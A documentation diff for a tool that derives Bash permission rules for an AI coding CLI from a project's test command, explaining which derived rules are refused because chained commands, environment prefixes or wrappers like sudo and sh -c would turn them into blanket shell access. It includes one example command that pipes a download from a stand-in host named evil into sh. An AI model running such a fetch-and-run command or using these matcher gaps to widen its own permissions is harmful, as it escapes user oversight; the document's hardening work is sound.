@@ -168,6 +168,27 @@ The cost is honest: a project whose tests shell out to something unexpected will
 denial is **visible** in `permission_denials` on the result event, so surface it in the UI with
 the tool that was refused, and let the fix be one line of config rather than a debugging session.
 
+**The safety story is verified against the CLI's own rule matcher**, extracted from the installed
+binary rather than reasoned about. The load-bearing result: `Bash(npm *)` **cannot** allow
+`npm test && curl evil | sh`, because the matcher rejects a prefix or wildcard allow rule for any
+command that splits into more than one. So a derived grant really is bounded by the program it
+names.
+
+Three refusals fall out of the same mechanism, and each would otherwise be a hole:
+
+| `testCmd` | Why the derived rule is refused |
+|---|---|
+| `cd packages/api && npm test` | No single rule can cover a chained command, by the result above. Refuse and ask for a rule per command, rather than emit one that silently matches nothing. |
+| `CI=1 npm test` | **Wrong in both directions.** Env prefixes are stripped for deny and ask rules but **not** for allow rules, so `Bash(npm *)` never matches; and `Bash(CI=1 *)` matches `CI=1` followed by *any* command, which is a blanket shell behind a harmless prefix. |
+| `sudo make test`, `sh -c '...'`, `timeout 60 npm test` | `Bash(sudo *)` is `Bash(*)` wearing a hat. The wrapper list is the CLI's own set of programs it strips before matching a **deny** rule and does not strip for an **allow** rule, which is exactly where a derived rule goes blanket. |
+
+A single-wildcard rule compiles to `^word( .*)?$`, so `Bash(vendor/bin/pest *)` does match the bare
+invocation — the derivation is not too narrow for a no-argument command.
+
+**Not probed live**, and worth stating: this covers the rule matcher, not the Bash tool's own
+security analysers, which can force an "ask" that headless mode then auto-denies. Nor does it
+cover policy from a managed profile.
+
 **Do not assume `bypassPermissions` holds for every profile.** A managed or enterprise profile can carry
 policy that restricts permission modes, models, or tools, so check `policy-limits.json` and run
 one real tool call before trusting a profile unattended. Treat a profile that refuses
